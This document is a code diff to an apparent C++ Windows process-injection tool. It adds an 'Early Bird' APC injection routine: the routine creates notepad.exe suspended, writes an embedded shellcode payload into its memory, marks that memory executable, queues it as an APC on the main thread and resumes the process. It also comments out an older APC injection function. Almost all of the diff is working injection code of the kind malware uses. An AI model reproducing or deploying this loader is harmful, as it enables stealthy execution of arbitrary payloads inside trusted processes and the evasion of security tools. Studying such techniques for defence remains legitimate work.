@@ -5,50 +5,6 @@
 #include <ntdef.h>
 #include "apc.h"
 
-
-/*
-BOOL FindTargetProcess(wchar_t* tgtProcessName, DWORD& pid, std::vector<DWORD>& tids) {
-    BOOL found = FALSE;
-    HANDLE hSnapShot = INVALID_HANDLE_VALUE;
-    //PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-    THREADENTRY32 te32 = { 0 };
-    te32.dwSize = sizeof(THREADENTRY32);
-
-    // Create snapshot of processes and their threads
-    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, NULL);
-    // iterate through all the processes
-    if (Process32First(hSnapShot, &pe32)) {
-        do {
-            // if the name of the process matches the target process
-
-            
-                //For reasons unknown for now, unable to compare szExeFile to tgtProcessName.
-                //TlHelp32.h reports szExeFile as WCHAR and tgtProcessName is a reference to wchar_t
-                //This should ideally not result in an error. Debug for later.
-                //Code should work even without this function by passing the target process id directly in the APCinjection function.
-            
-            if (_wcsicmp(pe32.szExeFile, tgtProcessName) == 0) {
-                pid = pe32.th32ProcessID;
-                wprintf(L"[!] Found target process with process id: %d\n", pid);
-                // iterate through the threads of the target process
-                if (Thread32First(hSnapShot, &te32)){
-                    do {
-                        // if the thread belongs to the process
-                        if (te32.th32OwnerProcessID == pe32.th32ProcessID) {
-                            tids.push_back(te32.th32OwnerProcessID);
-                        }
-                    } while (Thread32Next(hSnapShot, &te32));
-                }
-                found = true;
-            }
-        } while(Process32Next(hSnapShot, &pe32));
-    }
-    return found;
-}
-*/
-
 // tgtProcessId is provided by the user. pid and tids value is updated by the code (updated by pointer reference)
 BOOL FindTargetProcessById(int tgtProcessId, DWORD& pid, std::vector<DWORD>& tids) {
     BOOL found = FALSE;
@@ -92,7 +48,62 @@ BOOL FindTargetProcessById(int tgtProcessId, DWORD& pid, std::vector<DWORD>& tid
     return found;
 }
 
+BOOL EarlyBird(unsigned char payload[], SIZE_T payload_size) {
+    LPPROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
+    LPSTARTUPINFOA startInfo = new STARTUPINFOA();
+    LPVOID baseAddress = { 0 };
+    DWORD oldProtect;
+    NTSTATUS status;
 
+    #ifdef _WIN64
+        LPSTR targetExe = (LPSTR)"C:\\Windows\\System32\\notepad.exe";
+    #else
+        LPSTR targetExe = (LPSTR)"C:\\Windows\\SysWow64\\notepad.exe";
+    #endif
+
+    // create the target process in suspended mode
+    // this also implies that the main thread inside the process is also in a suspended state.
+    if(!CreateProcessA(NULL, targetExe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo)) {
+        printf("[!] Error creating notepad process in suspended more. Error: 0x%1x\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Successfully created notepad process in suspended mode\n");
+
+    printf("[!] Allocating memory inside the target process\n");
+    baseAddress = VirtualAllocEx(procInfo->hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // write to the memory of the target process
+    if(!WriteProcessMemory(procInfo->hProcess, baseAddress, payload, payload_size, NULL)) {
+        printf("[-] Failed to write to the memory of the target process 0x%1x\n", GetLastError());
+        return FALSE;
+    }
+
+    // change memory protection RW -> RX
+    if(!VirtualProtectEx(procInfo->hProcess, baseAddress, payload_size, PAGE_EXECUTE_READ, &oldProtect)) {
+        printf("[-] Failed to change the memory protection from RW -> RX 0x%1x\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Successfully changed the memory protection from RW -> RX\n");
+
+    // set thread routine
+    LPTHREAD_START_ROUTINE tRoutine = (LPTHREAD_START_ROUTINE)baseAddress;
+    // put the payload in APC queue
+    DWORD queueAPCStatus;
+    queueAPCStatus = QueueUserAPC((PAPCFUNC)tRoutine, procInfo->hThread, 0);
+    if (!queueAPCStatus) {
+        printf("[-] Failed to queue APC with error code: 0x%1x\n", GetLastError());
+        return FALSE;
+    } else {
+        printf("[+] Successfully queued to the APC\n");
+    }
+    // resume the suspended thread
+    ResumeThread(procInfo->hThread);
+    printf("[+] Suspended notepad process resumed (thread as well)\n");
+    Sleep(2000);
+
+    return TRUE;
+}
+
+/*
 int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
     HMODULE pNtdllModule = NULL;
     HANDLE hTargetProcess;
@@ -115,22 +126,12 @@ int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
     //DWORD pid = 0; since we are not using the FindTargetProcess, we do not need to use this variable.
     std::vector<DWORD> tids;
 
-    /*
-        FindTargetProcess searches a processes.
-        pid populates the process id of the target process.
-        tids returns a DWORD vector of thread id's associated with the process.
-        Note that the pid and tids are passed are pointer references to update with corresponding values.
-    */
-
-    /*
-        isSuccess = FindTargetProcess(exeName, pid, tids);
-        if (!isSuccess) {
-            printf("[-] Failed to find the target process\n");
-            exit(-1);
-        }
-        printf("[+] Successfully found the target process with pid: %d\n", pid);
-    */
-
+    
+        //FindTargetProcessById searches a processes.
+        //pid populates the process id of the target process.
+        //tids returns a DWORD vector of thread id's associated with the process.
+        //Note that the pid and tids are passed are pointer references to update with corresponding values.
+    
    // pid -. provided pid, tgtPid -> found pid
    isSuccess = FindTargetProcessById(pid, tgtPid, tids);
     if (!isSuccess) {
@@ -176,10 +177,10 @@ int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
     }
     printf("[+] Successfully changed the memory protection from RW -> RX\n");
 
-    /* 
-        Make a thread. the base addresss of this thread should point to the shellcode. 
-        When the thread goes to alerable state, the shellcode should get executed.
-    */
+     
+        //Make a thread. the base addresss of this thread should point to the shellcode. 
+        //When the thread goes to alerable state, the shellcode should get executed.
+    
     PTHREAD_START_ROUTINE tRoutine = (PTHREAD_START_ROUTINE)remoteBase;
 
     // loop through all the threads in the target process id
@@ -209,8 +210,10 @@ int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
 
     return 0;
 }
+*/
 
 int main(int argc, char **argv) {
+    bool earlyBirdStatus;
     int pid = 0;
 
     if (argc <2 || argc > 3){
@@ -252,5 +255,10 @@ int main(int argc, char **argv) {
 		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
     SIZE_T payload_size = sizeof(payload);
-    APCInjection(payload, payload_size, pid);
+    earlyBirdStatus = EarlyBird(payload, payload_size);
+    if (earlyBirdStatus) {
+        printf("[+]success!\n");
+    } else {
+        printf("[-] earlybird failed\n");
+    }
 }
